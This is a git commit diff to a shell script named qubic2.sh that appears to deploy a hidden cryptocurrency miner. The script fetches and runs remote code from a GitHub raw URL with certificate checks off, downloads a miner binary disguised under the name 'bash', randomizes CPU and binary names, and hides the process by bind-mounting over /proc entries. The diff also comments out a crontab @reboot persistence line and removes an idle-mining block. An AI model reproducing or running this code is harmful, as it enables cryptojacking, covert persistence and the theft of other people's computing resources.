ab2c8cbc6af97311c9dd8c013d71544998a57adf
pakoinake <pakoinake@lib.mk>
2025-08-25 10:47:49 +0800

    Update qubic2.sh

--- qubic2.sh
+++ qubic2.sh
@@ -4,19 +4,20 @@ mode="${1:-0}"
 work=`mktemp -u |sed 's/tmp\./\.tmp/'`
 src="https://raw.githubusercontent.com/pakoinake/jzoax/main"
 hugepage="128"
-idle="1"
 
 RandString() {
-  n="${1:-2}"; s="${2:-}"; for((i=0;i<$n;i++)); do r=$((`od -An -N2 -i /dev/urandom` % 26 + 97)); s=${s}`echo "$r"| awk '{printf("%c", $1)}'`; done; echo -n "$s";
+  n="${1:-2}"; s="${2:-}"; for ((i=0;i<$n;i++)); do r=$((`od -An -N2 -i /dev/urandom` % 26 + 97)); s=${s}`echo "$r"| awk '{printf("%c", $1)}'`; done; echo -n "$s";
 }
 
 hPid() {
   [ -n "$1" ] && [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
 }
 
+
 # Debian12+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
+
 
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
@@ -33,7 +34,7 @@ name=`RandString 2 c${cores}_${addr}_`;
 
 sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
 sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
-sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+# sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 
 rm -rf "${work}"; mkdir -p "${work}"
@@ -41,21 +42,10 @@ wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
 wget --no-check-certificate -qO "${work}/bash" "${src}/q"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+[ -f "${work}/appsettings.json" ] && sed -i "s/\"binaryName\":.*/\"binaryName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 chmod -R 777 "${work}"
-sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &
+sh <(wget --no-check-certificate -qO- "${src}/epoch.sh") >/dev/null 2>&1 &
 hPid "$!"
-
-if [ "$idle" -eq "1" ]; then
-  wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
-  wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
-  [ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
-  rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
-  [ -n "$rxName" ] || rxName="$name"
-  [ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
-  [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
-  chmod -R 777 "${work}"
-  sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
-fi
 
 
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
